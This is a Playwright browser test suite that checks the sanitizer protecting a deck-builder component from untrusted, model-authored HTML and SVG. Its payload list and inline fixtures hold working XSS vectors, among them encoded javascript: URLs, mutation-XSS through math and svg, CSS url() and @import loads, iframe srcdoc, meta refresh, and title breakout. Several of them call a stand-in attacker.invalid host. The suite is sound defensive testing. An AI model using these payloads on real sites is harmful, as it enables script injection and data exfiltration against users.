/**
 * Browser-level security proof for Deck Builder's untrusted markup boundary (#752).
 *
 * The shipped SPA intentionally does NOT expose Deck Builder yet: App.tsx still
 * redirects /decks as the M0 containment for parent #311. Testing that route
 * would therefore prove only the redirect. This spec instead bundles the exact
 * DeckBuilder.tsx + deckSanitizer.ts copied into the Playwright image and mounts
 * them on an ephemeral localhost page inside the test container. Production
 * routing stays contained while the real component, React event path, browser
 * HTML parser, presentation mode, and HTML export are all exercised.
 */

import { build } from "esbuild";
import {
  expect,
  test,
  type Browser,
  type BrowserContext,
  type Download,
  type Page,
} from "@playwright/test";
import { createServer, type Server } from "node:http";
import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

const ATTACKER = "attacker.invalid";

let context: BrowserContext;
let page: Page;
let server: Server;
let harnessUrl: string;
let workDir: string;
let chatReply = "<slide><h1>Safe slide</h1></slide>";
let attackerRequests: string[] = [];

async function readDownload(download: Download): Promise<string> {
  const path = await download.path();
  if (!path) throw new Error("Playwright did not expose the downloaded Deck HTML path");
  return readFile(path, "utf8");
}

async function startHarness(browser: Browser): Promise<void> {
  workDir = await mkdtemp(join(tmpdir(), "maistro-deck-"));
  const entry = join(workDir, "deck-harness.tsx");
  const bundle = join(workDir, "deck-harness.js");

  await writeFile(
    entry,
    `import React from "react";
import { createRoot } from "react-dom/client";
import DeckBuilder from "/tests/frontend/src/pages/DeckBuilder.tsx";
import { sanitizeDeckMarkup } from "/tests/frontend/src/lib/deckSanitizer.ts";

declare global {
  interface Window { __sanitizeDeckMarkup: (markup: string) => string; __deckPwned?: number; }
}
window.__sanitizeDeckMarkup = sanitizeDeckMarkup;
createRoot(document.getElementById("root")!).render(<DeckBuilder />);
`,
    "utf8",
  );

  await build({
    entryPoints: [entry],
    outfile: bundle,
    bundle: true,
    platform: "browser",
    format: "iife",
    jsx: "automatic",
    define: { "process.env.NODE_ENV": '"test"' },
    // The entry lives under /tmp, while npm dependencies live under /tests.
    // Explicitly name that search root rather than relying on cwd resolution.
    nodePaths: ["/tests/node_modules"],
    logLevel: "silent",
  });

  server = createServer(async (request, response) => {
    if (request.method === "POST" && request.url === "/v1/chat/complete") {
      // Drain the request so keep-alive behaves like a normal HTTP endpoint.
      for await (const _chunk of request) {
        // body intentionally ignored; the browser path is what this spec owns
      }
      response.writeHead(200, { "content-type": "application/json" });
      response.end(JSON.stringify({ choices: [{ message: { content: chatReply } }] }));
      return;
    }

    if (request.url === "/deck-harness.js") {
      response.writeHead(200, { "content-type": "text/javascript; charset=utf-8" });
      response.end(await readFile(bundle));
      return;
    }

    response.writeHead(200, { "content-type": "text/html; charset=utf-8" });
    response.end(
      '<!doctype html><html><head><meta charset="utf-8"><title>Deck test</title></head>' +
        '<body><div id="root"></div><script src="/deck-harness.js"></script></body></html>',
    );
  });

  await new Promise<void>((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => resolve());
  });
  const address = server.address();
  if (!address || typeof address === "string") {
    throw new Error("Deck harness did not bind a TCP port");
  }
  harnessUrl = `http://127.0.0.1:${address.port}`;

  context = await browser.newContext();
  page = await context.newPage();
  page.on("request", (request) => {
    if (request.url().includes(ATTACKER)) attackerRequests.push(request.url());
  });
  await page.addInitScript(() => {
    (window as Window & { __deckPwned?: number }).__deckPwned = 0;
  });
}

async function loadFresh(): Promise<void> {
  attackerRequests = [];
  await page.goto(harnessUrl, { waitUntil: "domcontentloaded" });
  await expect(page.getByPlaceholder(/Describe slides to generate/)).toBeVisible();
}

async function generate(reply: string): Promise<void> {
  chatReply = reply;
  const prompt = page.getByPlaceholder(/Describe slides to generate/);
  await prompt.fill("Generate the security test slide");
  await page.getByRole("button", { name: "Generate" }).click();
  await expect(prompt).toHaveValue("");
}

function expectNoExecutableMarkup(html: string, allowTrustedDocumentMeta = false): void {
  expect(html).not.toMatch(
    /<\s*(?:script|iframe|form|img|object|embed|link|base|foreignObject|use|a)\b/i,
  );
  if (allowTrustedDocumentMeta) {
    expect(html).not.toMatch(/<meta\b[^>]*(?:http-equiv|content\s*=)/i);
  } else {
    expect(html).not.toMatch(/<meta\b/i);
  }
  expect(html).not.toMatch(/\son[a-z]+\s*=/i);
  expect(html).not.toMatch(/(?:javascript|vbscript|data)\s*:/i);
  expect(html).not.toMatch(/url\s*\(/i);
  expect(html).not.toContain(ATTACKER);
}

test.describe.configure({ mode: "serial" });

test.beforeAll(async ({ browser }) => {
  await startHarness(browser);
});

test.afterAll(async () => {
  await context.close();
  await new Promise<void>((resolve, reject) =>
    server.close((error) => (error ? reject(error) : resolve())),
  );
  await rm(workDir, { recursive: true, force: true });
});

test("model-authored HTML/SVG is sanitized before preview and presentation render", async () => {
  await loadFresh();
  const hostile = `<slide>
    <h1>Safe deck content</h1>
    <script>window.__deckPwned = 1</script>
    <img src="http://${ATTACKER}/pixel" onerror="window.__deckPwned = 2">
    <a href="javascript:window.__deckPwned=3">navigate</a>
    <iframe src="http://${ATTACKER}/frame"></iframe>
    <form action="http://${ATTACKER}/submit"><input name="secret"></form>
    <div style="background-image:url(http://${ATTACKER}/css);color:rgb(255,0,0)">CSS survivor</div>
    <svg viewBox="0 0 20 20" width="20" height="20">
      <foreignObject><iframe src="http://${ATTACKER}/svg-frame"></iframe></foreignObject>
      <circle cx="10" cy="10" r="8" fill="#a78bfa" onload="window.__deckPwned=4" />
    </svg>
  </slide>`;

  await generate(hostile);

  const preview = page.locator('[contenteditable="true"]');
  await expect(preview).toContainText("Safe deck content");
  await expect(preview.locator("svg circle")).toHaveCount(1);
  await expect(preview.locator("script, img, a, iframe, form, foreignObject")).toHaveCount(0);
  const previewHtml = await preview.innerHTML();
  expectNoExecutableMarkup(previewHtml);
  expect(previewHtml).toContain("color: rgb(255, 0, 0)");
  expect(
    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
  ).toBe(0);
  expect(attackerRequests).toEqual([]);

  await page.getByRole("button", { name: "Present" }).click();
  const exit = page.getByRole("button", { name: "Exit (Esc)" });
  await expect(exit).toBeVisible();
  const presentation = exit.locator("..");
  await expect(presentation).toContainText("Safe deck content");
  await expect(presentation.locator("svg circle")).toHaveCount(1);
  const presentationHtml = await presentation.innerHTML();
  expectNoExecutableMarkup(presentationHtml);
  expect(
    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
  ).toBe(0);
  expect(attackerRequests).toEqual([]);
});

test("contentEditable changes and exported HTML cross the same sanitizer boundary", async () => {
  await loadFresh();
  const preview = page.locator('[contenteditable="true"]');
  await expect(preview).toBeVisible();

  await preview.evaluate(
    (element, attacker) => {
      element.innerHTML = `<h2>Edited safely</h2><img src="http://${attacker}/edit" onerror="window.__deckPwned=5"><svg><foreignObject><script>window.__deckPwned=6</script></foreignObject><rect width="10" height="10" fill="#fff"></rect></svg>`;
    },
    ATTACKER,
  );
  await preview.focus();
  await page.keyboard.press("Tab");
  await expect(preview).toContainText("Edited safely");
  await expect(preview.locator("img, foreignObject, script")).toHaveCount(0);
  expectNoExecutableMarkup(await preview.innerHTML());

  // The title used to be interpolated raw into the exported <title> element.
  await page.locator("input").first().fill('</title><script>window.__deckPwned=7</script><title>');
  const downloadPromise = page.waitForEvent("download");
  await page.getByRole("button", { name: "Export HTML" }).click();
  const exported = await readDownload(await downloadPromise);

  expect(exported).toContain("Edited safely");
  expect(exported).toContain("&lt;/title&gt;");
  expectNoExecutableMarkup(exported, true);
  expect(
    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
  ).toBe(0);
  expect(attackerRequests).toEqual([]);
});

test("mutation, encoded, SVG, and CSS payload families fail closed while presentation markup survives", async () => {
  await loadFresh();
  const payloads = [
    '<svg><g/onload=window.__deckPwned=10//<p>safe</p></svg>',
    '<math><mtext><img src=x onerror=window.__deckPwned=11></mtext></math><strong>safe</strong>',
    '<a href="jav&#x61;script:window.__deckPwned=12">bad</a><em>safe</em>',
    '<svg><use href="http://attacker.invalid/icon#x"></use><circle cx="5" cy="5" r="4"></circle></svg>',
    '<div style="background:url(\\6a avascript:alert(1));color:#fff">safe</div>',
    '<div style="background-image:image-set(url(http://attacker.invalid/a) 1x);font-size:20px">safe</div>',
    '<style>@import url(http://attacker.invalid/x);</style><p>safe</p>',
    '<iframe srcdoc="<script>window.__deckPwned=13<\/script>"></iframe><u>safe</u>',
    '<meta http-equiv="refresh" content="0;url=http://attacker.invalid/refresh"><small>safe</small>',
  ];

  const outputs = await page.evaluate((items) => {
    const sanitize = (
      window as Window & { __sanitizeDeckMarkup: (markup: string) => string }
    ).__sanitizeDeckMarkup;
    return items.map((item) => sanitize(item));
  }, payloads);

  for (const output of outputs) expectNoExecutableMarkup(output);
  expect(outputs.join(" ")).toContain("safe");

  const safePresentation = await page.evaluate(() => {
    const sanitize = (
      window as Window & { __sanitizeDeckMarkup: (markup: string) => string }
    ).__sanitizeDeckMarkup;
    return sanitize(
      '<div style="display:flex;background:linear-gradient(135deg,#0f0c29,#302b63);color:#fff"><strong>Portfolio</strong><svg viewBox="0 0 20 20"><circle cx="10" cy="10" r="8" fill="#a78bfa" stroke="#fff" stroke-width="2"></circle></svg></div>',
    );
  });

  expect(safePresentation).toContain("linear-gradient");
  expect(safePresentation).toContain("<strong>Portfolio</strong>");
  expect(safePresentation).toContain("<circle");
  expect(
    await page.evaluate(() => (window as Window & { __deckPwned?: number }).__deckPwned),
  ).toBe(0);
  expect(attackerRequests).toEqual([]);
});

test("built-in Deck templates remain renderable through the sanitizer", async () => {
  await loadFresh();
  await page.getByRole("button", { name: /Hero KPI/ }).click();

  const preview = page.locator('[contenteditable="true"]');
  await expect(preview).toContainText("Portfolio Snapshot");
  await expect(preview).toContainText("Active Use Cases");
  const html = await preview.innerHTML();
  expect(html).toContain("linear-gradient");
  expectNoExecutableMarkup(html);
});
